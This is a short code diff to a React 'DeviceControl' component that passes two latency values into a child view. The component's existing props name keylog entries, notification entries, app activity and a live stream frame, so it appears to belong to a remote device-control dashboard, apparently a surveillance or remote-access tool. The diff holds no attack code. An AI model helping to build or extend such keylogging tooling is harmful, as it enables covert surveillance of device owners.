@@ -30,7 +30,7 @@ const TABS = [
   { id: 'permissions',   label: '🛡️ App Mode' },
 ];
 
-export default function DeviceControl({ device, sendCommand, results, pending, onBack, streamFrame, send, keylogPushEntries, notifPushEntries, activityAppEntries }) {
+export default function DeviceControl({ device, sendCommand, results, pending, onBack, streamFrame, send, keylogPushEntries, notifPushEntries, activityAppEntries, serverLatency, deviceLatency }) {
   const [activeTab, setActiveTab] = useState('control_center');
   const info     = device.deviceInfo || {};
   const isOnline = device.isOnline;
@@ -105,6 +105,8 @@ export default function DeviceControl({ device, sendCommand, results, pending, o
             results={results}
             streamFrame={streamFrame}
             send={send}
+            serverLatency={serverLatency}
+            deviceLatency={deviceLatency}
           />
         </div>
       )}
